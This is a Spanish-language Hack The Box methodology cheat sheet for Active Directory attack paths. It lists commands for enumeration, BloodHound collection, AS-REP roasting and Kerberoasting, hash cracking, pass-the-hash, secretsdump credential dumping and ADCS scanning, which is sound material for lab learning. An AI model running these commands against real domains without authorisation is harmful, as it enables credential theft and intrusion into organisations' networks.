---
title: HTB AD Attack Paths
tags: [htb, methodology, active-directory, attack-paths]
created: 2026-04-29
related:
  - "[[HTB/Windows AD/cheatsheet|Windows AD Enumeration]]"
  - "[[HTB/Windows AD/attacks-and-privesc|Windows AD Attacks and Privesc]]"
---

# HTB AD Attack Paths

> [!abstract] TL;DR
> En AD no busques solo CVEs. Buscá relaciones: usuarios, grupos, SPNs, shares, sesiones, ACLs, delegación y credenciales reutilizadas.

## Setup

```bash
export IP=10.10.10.10
export DOMAIN=example.htb
export USER=user
export PASS='pass'
```

```bash
echo "$IP dc01.$DOMAIN $DOMAIN" | sudo tee -a /etc/hosts
```

## Enumeración base

```bash
nmap -sV -sC -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985 $IP
crackmapexec smb $IP
smbclient -L //$IP -N
ldapsearch -x -H ldap://$IP -s base namingcontexts
```

## Con credenciales

```bash
crackmapexec smb $IP -u "$USER" -p "$PASS"
crackmapexec winrm $IP -u "$USER" -p "$PASS"
crackmapexec smb $IP -u "$USER" -p "$PASS" --shares
```

## BloodHound

```bash
bloodhound-python -u "$USER" -p "$PASS" -d "$DOMAIN" -ns $IP -c All --zip
```

Buscar:

- ruta a `Domain Admins`;
- `GenericAll`, `GenericWrite`, `WriteDacl`, `WriteOwner`;
- `ForceChangePassword`;
- `AddMember`;
- sesiones de admins;
- delegation;
- grupos anidados.

## Roasting

AS-REP:

```bash
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -dc-ip $IP -no-pass
```

Kerberoast:

```bash
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $IP -request
```

Crack:

```bash
hashcat -m 18200 asrep.hashes rockyou.txt
hashcat -m 13100 kerb.hashes rockyou.txt
```

## Credenciales y movimiento

```bash
crackmapexec smb targets.txt -u "$USER" -p "$PASS"
crackmapexec winrm targets.txt -u "$USER" -p "$PASS"
evil-winrm -i $IP -u "$USER" -p "$PASS"
```

Pass-the-hash:

```bash
crackmapexec smb $IP -u user -H NTLM_HASH
evil-winrm -i $IP -u user -H NTLM_HASH
```

## Secretsdump

```bash
impacket-secretsdump $DOMAIN/$USER:$PASS@$IP
impacket-secretsdump $DOMAIN/user@$IP -hashes :NTLM_HASH
```

## ADCS

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip $IP -vulnerable -stdout
```

## Checklist

```text
[ ] Dominio y DC identificados
[ ] Usuarios válidos
[ ] SMB/LDAP con credenciales
[ ] Shares revisados
[ ] BloodHound recolectado
[ ] AS-REP roast
[ ] Kerberoast
[ ] ACLs abusables
[ ] WinRM o admin local
[ ] Secretsdump si hay permisos
[ ] ADCS revisado
```
